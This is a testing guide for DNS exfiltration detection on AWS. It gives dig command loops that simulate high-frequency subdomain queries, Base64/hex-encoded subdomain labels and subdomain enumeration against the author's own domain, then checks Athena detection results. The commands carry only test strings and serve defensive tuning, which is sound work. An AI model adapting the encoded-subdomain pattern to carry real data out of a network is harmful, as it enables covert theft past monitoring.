# DNS Exfiltration Detection Testing Guide

This guide provides step-by-step instructions for testing each of the DNS threat detection queries.

## Prerequisites

- SSH access to EC2 instance: `ssh ec2-user@35.176.181.211 -i ~/.ssh/id_rsa`
- AWS Athena console access with workgroup: `dns-exfiltration-analysis`
- Domain for testing: `*.andrewrea.co.uk` (replace with your domain)

## Test Environment Setup

1. **Connect to EC2 instance**:
   ```bash
   ssh ec2-user@35.176.181.211 -i ~/.ssh/id_rsa
   ```

2. **Wait 5-10 minutes** after running DNS queries for logs to appear in S3

3. **Run Athena queries** in the AWS console under workgroup `dns-exfiltration-analysis`

---

## Test 1: DNS Exfiltration Detection

**Objective**: Simulate high frequency subdomain queries indicating data exfiltration

**Pattern**: >20 queries with subdomains in 5 minutes

### Test Steps:

**Minute 0 - Generate exfiltration pattern**:
```bash
# Run on EC2 instance
for i in {1..25}; do 
  dig "data${i}.evil.andrewrea.co.uk"
  sleep 10  # 25 queries over ~4 minutes
done
```

**Minute 5 - Check results**:
1. Go to AWS Athena console
2. Run saved query: **"DNS Exfiltration Detection"**
3. **Expected Result**: 
   - Shows `evil.andrewrea.co.uk` 
   - `severity`: HIGH or CRITICAL
   - `query_count`: 25
   - `threat_type`: HIGH_FREQUENCY

---

## Test 2: DNS Data Encoding Detection

**Objective**: Detect Base64/Hex encoded data in DNS subdomain names

**Pattern**: Long subdomains (>15 chars) with encoding patterns

### Test Steps:

**Minute 0 - Generate encoded data queries**:
```bash
# Base64 encoded queries ("HelloWorld", "This is a test")
dig "SGVsbG9Xb3JsZA.evil.andrewrea.co.uk"
dig "VGhpcyBpcyBhIHRlc3Q.evil.andrewrea.co.uk"

# Hex encoded queries ("HelloWorld", "Another test string")  
dig "48656c6c6f576f726c64.evil.andrewrea.co.uk"
dig "416e6f74686572207465737420737472696e67.evil.andrewrea.co.uk"

# Repeat the pattern 2-3 times to hit >5 threshold
dig "SGVsbG9Xb3JsZA.evil.andrewrea.co.uk"
dig "48656c6c6f576f726c64.evil.andrewrea.co.uk"
```

**Minute 5 - Check results**:
1. Go to AWS Athena console
2. Run saved query: **"DNS Data Encoding Detection"**
3. **Expected Result**:
   - Shows `evil.andrewrea.co.uk`
   - `encoding_patterns`: ['BASE64', 'HEX']
   - `avg_label_length`: 20-30
   - `threat_type`: DATA_ENCODING

---

## Test 3: Subdomain Enumeration Detection

**Objective**: Detect reconnaissance via multiple unique subdomains

**Pattern**: >5 unique subdomains per apex domain (recon behavior)

### Test Steps:

**Minute 0 - Generate reconnaissance pattern**:
```bash
# Simulate subdomain enumeration/scanning
dig "admin.target.andrewrea.co.uk"
dig "mail.target.andrewrea.co.uk"
dig "ftp.target.andrewrea.co.uk"
dig "api.target.andrewrea.co.uk"
dig "dev.target.andrewrea.co.uk"
dig "staging.target.andrewrea.co.uk"
dig "test.target.andrewrea.co.uk"
dig "www.target.andrewrea.co.uk"
```

**Minute 5+ - Check results**:
1. Go to AWS Athena console
2. Run saved query: **"Subdomain Enumeration Detection"**
3. **Expected Result**:
   - Shows `target.andrewrea.co.uk`
   - `unique_subdomains`: 8
   - `total_queries`: 8
   - Used for investigation/alerting (not automatic blocking)

---

## Combined Testing

**Run all tests simultaneously** using different subdomains:

```bash
# Terminal 1 - Exfiltration test
for i in {1..25}; do dig "data${i}.evil.andrewrea.co.uk"; sleep 10; done &

# Terminal 2 - Encoding test  
for i in {1..3}; do
  dig "SGVsbG9Xb3JsZA.encoding.andrewrea.co.uk"
  dig "48656c6c6f576f726c64.encoding.andrewrea.co.uk"
  sleep 30
done &

# Terminal 3 - Enumeration test
for subdomain in admin mail ftp api dev staging test www; do
  dig "${subdomain}.recon.andrewrea.co.uk"
  sleep 5
done &
```

---

## Troubleshooting

### No Results in Athena

1. **Check S3 logs**: Verify new files in `s3://dnsexfil-demo-athena-logs/AWSLogs/.../vpcdnsquerylogs/`
2. **Refresh table metadata**: Run `MSCK REPAIR TABLE dns_logs_db.resolver_dns_logs;` in Athena
3. **Check timing**: DNS logs may take 5-15 minutes to appear in S3
4. **Verify VPC**: Ensure DNS queries are from the correct VPC

### False Negatives

- **Threshold too high**: Reduce query thresholds in saved queries if needed
- **Time window**: Ensure queries run within the 5-minute detection window
- **Subdomain requirement**: Remember queries to apex domains (e.g., `google.com`) are ignored

### Expected Legitimate Traffic

These patterns should **NOT** trigger alerts:
- `google.com` (direct apex domain)
- `api.github.com` (legitimate API calls)
- `10 calls to same subdomain` (below threshold)

---

## Query Thresholds Summary

| Detection Type | Time Window | Threshold | Purpose |
|---|---|---|---|
| DNS Exfiltration | 5 minutes | >20 queries | Lambda automation |
| Data Encoding | 5 minutes | >5 queries | Lambda automation |  
| Subdomain Enumeration | 24 hours | >5 subdomains | Investigation/alerting |

---

## Lambda Integration

For automated blocking, your Lambda should:

1. **Run queries #1 and #2 every 5 minutes**
2. **Parse results** for `apex_domain` and `severity`
3. **Block domains** where `severity` ∈ {'CRITICAL', 'HIGH'}
4. **Add to Route 53 DNS Firewall** blocklist automatically

**Note**: Query #3 (Subdomain Enumeration) is for investigation/alerting, not automatic blocking.